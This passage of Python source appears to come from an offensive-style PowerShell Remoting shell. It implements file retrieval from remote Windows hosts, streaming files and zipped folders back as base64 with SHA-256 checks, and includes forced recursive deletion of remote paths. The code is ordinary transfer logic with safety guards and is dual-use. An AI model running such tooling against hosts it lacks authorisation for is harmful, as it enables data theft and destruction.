            f"Resolve-Path -LiteralPath '{self._pse(remote_path)}' | Select -Expand Path"
        )
        if not path_raw:
            raise FileNotFoundError(f"remote file not found: {remote_path}")
        path = self._validate_remote_path(path_raw)
        path_ps = self._pse(path)
        if self.run_sync(f"Test-Path -LiteralPath '{path_ps}' -PathType Container").strip().lower() == "true":
            raise IsADirectoryError(f"remote path is a directory: {path}")

        if max_bytes is None:
            try:
                max_bytes = int(os.environ.get("PWNRM_MAX_DL", 256 * 1024 * 1024))
            except ValueError:
                max_bytes = 256 * 1024 * 1024
        if max_bytes <= 0:
            raise ValueError("maximum remote file size must be positive")

        metadata = self.run_sync(
            f"$item = Get-Item -LiteralPath '{path_ps}' -Force -ErrorAction Stop; "
            "$item.Length; "
            f"Get-FileHash -LiteralPath '{path_ps}' -Algorithm SHA256 | Select-Object -ExpandProperty Hash"
        ).splitlines()
        if len(metadata) < 2:
            raise OSError("could not retrieve remote file metadata")
        try:
            remote_size = int(metadata[0].strip())
        except ValueError as exc:
            raise OSError("remote file returned an invalid size") from exc
        expected_hash = metadata[-1].strip().upper().encode("ascii")
        if remote_size < 0 or remote_size > max_bytes:
            raise RuntimeError(f"remote stream exceeds {max_bytes} bytes")
        if not re.fullmatch(rb"[0-9A-F]{64}", expected_hash):
            raise OSError("remote file returned an invalid SHA-256 value")

        if remote_size >= 256 * 1024:
            try:
                return self._read_remote_file_smb(
                    path,
                    remote_size,
                    expected_hash,
                    max_bytes,
                )
            except Exception as exc:
                logging.debug("SMB bulk-transfer fast path unavailable: %s", exc)

        transfer_chunk_size = self._transfer_chunk_size()
        script = f"""
$hash = '{expected_hash.decode("ascii")}'
$file = [System.IO.File]::OpenRead('{path_ps}')
try {{
    $buffer = New-Object byte[] {transfer_chunk_size}
    while (($count = $file.Read($buffer, 0, $buffer.Length)) -gt 0) {{
        [Convert]::ToBase64String($buffer, 0, $count)
    }}
}} finally {{
    $file.Dispose()
}}
[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($hash))
"""
        streamed = bytearray()
        started = time.monotonic()
        last_update = 0.0
        error_count = len(getattr(self, "last_run_errors", []))

        def collect(output):
            nonlocal last_update
            stdout = output.get("stdout")
            if not stdout:
                return
            for line in str(stdout).splitlines():
                encoded = line.strip()
                if not encoded:
                    continue
                chunk = b64decode(encoded, validate=True)
                if len(streamed) + len(chunk) > max_bytes + 64:
                    raise RuntimeError(f"remote stream exceeds {max_bytes} bytes")
                streamed.extend(chunk)
                now = time.monotonic()
                received = min(len(streamed), remote_size)
                if now - last_update >= 0.25 or received == remote_size:
                    elapsed = max(now - started, 0.001)
                    pct = min(100.0, received * 100.0 / max(remote_size, 1))
                    rate = received / 1048576 / elapsed
                    self.write_progress(
                        f"PSRP transfer {received}/{remote_size} bytes ({pct:.1f}%) — {rate:.2f} MiB/s"
                    )
                    last_update = now

        try:
            interrupted = self.run_with_interrupt(script, collect)
            if interrupted:
                raise InterruptedError(f"remote file streaming interrupted: {path}")
            new_errors = getattr(self, "last_run_errors", [])[error_count:]
            if new_errors:
                raise OSError("; ".join(new_errors))
            if len(streamed) < 64:
                raise OSError("remote stream did not include a SHA-256 trailer")
            payload = bytearray(streamed[:-64])
            if len(payload) != remote_size:
                received_size = len(payload)
                payload[:] = b"\x00" * len(payload)
                raise OSError(f"PSRP transfer length mismatch: {received_size} != {remote_size}")
            actual = SHA256.new(payload).hexdigest().upper().encode("ascii")
            if streamed[-64:] != expected_hash or actual != expected_hash:
                payload[:] = b"\x00" * len(payload)
                raise OSError("remote file SHA-256 verification failed")
            return payload
        finally:
            streamed[:] = b"\x00" * len(streamed)

    def delete_remote_path(self, remote_path: str, recursive: bool = False) -> bool:
        """Delete one validated remote path and verify that it no longer exists."""
        path = self._validate_remote_path(remote_path)
        path_ps = self._pse(path)
        recurse = " -Recurse" if recursive else ""
        error_count = len(getattr(self, "last_run_errors", []))
        result = self.run_sync(
            f"if (Test-Path -LiteralPath '{path_ps}') {{ "
            f"Remove-Item -LiteralPath '{path_ps}' -Force{recurse} -ErrorAction Stop }}; "
            f"Test-Path -LiteralPath '{path_ps}'"
        ).strip().lower()
        return result == "false" and len(getattr(self, "last_run_errors", [])) == error_count

    # ── !download (FIX-01, FIX-03, FIX-07, OPT-07) ────────────────────────────
    def download(self, cmdline: str):
        args = split_args(cmdline)
        if not args or len(args) > 2:
            self.write_warning("usage: !download RPATH [LPATH]"); return {"status": "error"}

        # [FIX-03] Always derive default local filename from user-supplied RPATH
        user_rpath = PureWindowsPath(args[0])
        safe_filename = user_rpath.name or "downloaded_file"

        src_raw = self.run_sync(f"Resolve-Path -LiteralPath '{self._pse(args[0])}' | Select -Expand Path")
        if not src_raw:
            self.write_warning(f"{args[0]} not found on remote"); return {"status": "error"}

        try:
            src_validated = self._validate_remote_path(src_raw)
        except ValueError as e:
            self.write_error(str(e)); return {"status": "error", "error": str(e)}

        src    = PureWindowsPath(src_validated)
        src_ps = self._pse(src)
        src_pde = self._pde(src)

        dst = Path(args[1]) if len(args) == 2 else Path(safe_filename)
        if dst.is_dir(): 
            dst = dst / safe_filename

        dst_resolved = dst.resolve()
        cwd_resolved = Path.cwd().resolve()

        # Path traversal guard for relative local paths
        if len(args) < 2 and not str(dst_resolved).startswith(str(cwd_resolved)):
            self.write_error(f"Refusing path outside CWD: {dst_resolved}")
            return {"status": "error"}

        if not dst.parent.exists(): 
            os.makedirs(dst.parent, exist_ok=True)

        is_dir = self.run_sync(f"Test-Path -LiteralPath '{src_ps}' -PathType Container").strip().lower() == "true"
        if is_dir:
            if not dst.name.lower().endswith(".zip"): 
                dst = dst.parent / f"{dst.name}.zip"
                
            tmpdir_raw = self.run_sync("[System.IO.Path]::GetTempPath()").strip()
            try:
                tmpdir_validated = self._validate_remote_path(tmpdir_raw)
            except ValueError:
                tmpdir_validated = "C:\\Windows\\Temp\\"
            tmpdir    = tmpdir_validated
            tmpnm     = secrets.token_hex(8)
            tmpfn     = tmpdir + tmpnm
            tmpfn_ps  = self._pse(tmpfn)

            ps = f"""
Add-Type -AssemblyName "System.IO.Compression.FileSystem"
[IO.Compression.ZipFile]::CreateFromDirectory('{src_ps}', '{tmpfn_ps}.zip',
    [IO.Compression.CompressionLevel]::Fastest, $false)
"""
            if self.run_with_interrupt(ps, self.write_line):
                return {"status": "interrupted"}
            if getattr(self, "last_run_errors", []):
                return {"status": "error", "error": "; ".join(self.last_run_errors)}
            src    = tmpfn + ".zip"
            src_ps = self._pse(src)

        transfer_chunk_size = self._transfer_chunk_size()
        ps = f"""function Download-Remote {{
    $h = Get-FileHash -LiteralPath '{src_ps}' -Algorithm SHA256 | Select -Expand Hash;
    $f = [System.IO.File]::OpenRead('{src_ps}');
    $b = New-Object byte[] {transfer_chunk_size};
    while(($n = $f.Read($b, 0, {transfer_chunk_size})) -gt 0) {{ [Convert]::ToBase64String($b, 0, $n) }};
    $f.Close();
    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($h));
}}
Download-Remote
Remove-Item Function:Download-Remote
"""
        self.write_info(f"  [~] Streaming {c(C,str(src))} ...")
        buf = bytearray()
        try:
            max_bytes = int(os.environ.get("PWNRM_MAX_DL", 256 * 1024 * 1024))
            if max_bytes <= 0:
                raise ValueError
        except ValueError:
            self.write_warning("PWNRM_MAX_DL is invalid; using the 256 MiB default.")
            max_bytes = 256 * 1024 * 1024

        def collect(out):
            if part := out.get("stdout"):
                try:
                    chunk = b64decode(part)
                    if len(buf) + len(chunk) > max_bytes:
                        raise RuntimeError(f"OOM guard: stream exceeds {max_bytes} bytes")
                    buf.extend(chunk)  # [FIX-01] in-place accumulation on shared bytearray
                    self.write_progress(f"Download {len(buf)} bytes")
                except RuntimeError as e:
                    self.write_error(str(e))
                    raise e
                except Exception:
                    self.write_warning("Received malformed Base64 chunk from server (skipped)")

        try:
            interrupted = self.run_with_interrupt(ps, collect)
        except RuntimeError as exc:
            self.runspace.interrupt()
            buf[:] = b'\x00' * len(buf)
            if is_dir:
                self.run_sync(f"Remove-Item -Force -LiteralPath '{src_ps}'")
            return {"status": "error", "error": str(exc)}

        if is_dir: self.run_sync(f"Remove-Item -Force -LiteralPath '{src_ps}'")
        if interrupted:
            buf[:] = b'\x00' * len(buf)
            return {"status": "interrupted"}

        if len(buf) == 0:
            self.write_error(
                "  Download failed: no data received from server "
                "(empty stream or collection failure)."
            )
            return {"status": "error"}

        if len(buf) < 64:
            self.write_error(
                f"  Download failed: server returned {len(buf)} bytes "
                "(expected at least 64-byte SHA-256 trailer)."
            )
            return {"status": "error"}

        expected_sha256 = SHA256.new(buf[:-64]).hexdigest().upper().encode()
        if buf[-64:] != expected_sha256:
            buf[:] = b'\x00' * len(buf)  # [OPT-07] zeroize sensitive buffer in memory
            self.write_error("  Download integrity check FAILED — file corrupted or tampered!")
            return {"status": "error", "error": "integrity check failed"}
            
        self.write_info(f"  [+] Writing {c(G,str(dst.resolve()))}")
        fd = -1
        try:
            if dst.is_symlink():
                raise OSError(f"Refusing to overwrite symbolic link: {dst}")
            flags = os.O_CREAT | os.O_WRONLY | os.O_TRUNC
            if hasattr(os, "O_NOFOLLOW"):
                flags |= os.O_NOFOLLOW
            fd = os.open(dst, flags, 0o600)
            if hasattr(os, "fchmod"):
                os.fchmod(fd, 0o600)
            with os.fdopen(fd, "wb") as f:
                fd = -1
                f.write(buf[:-64])
            self.write_info(c(G, "  [+] Download complete — SHA-256 verified."))
            return {"status": "completed", "path": str(dst.resolve())}
        except IOError as e:
            self.write_error(str(e))
            return {"status": "error", "error": str(e)}
        finally:
            if fd >= 0:
                os.close(fd)
            buf[:] = b'\x00' * len(buf)
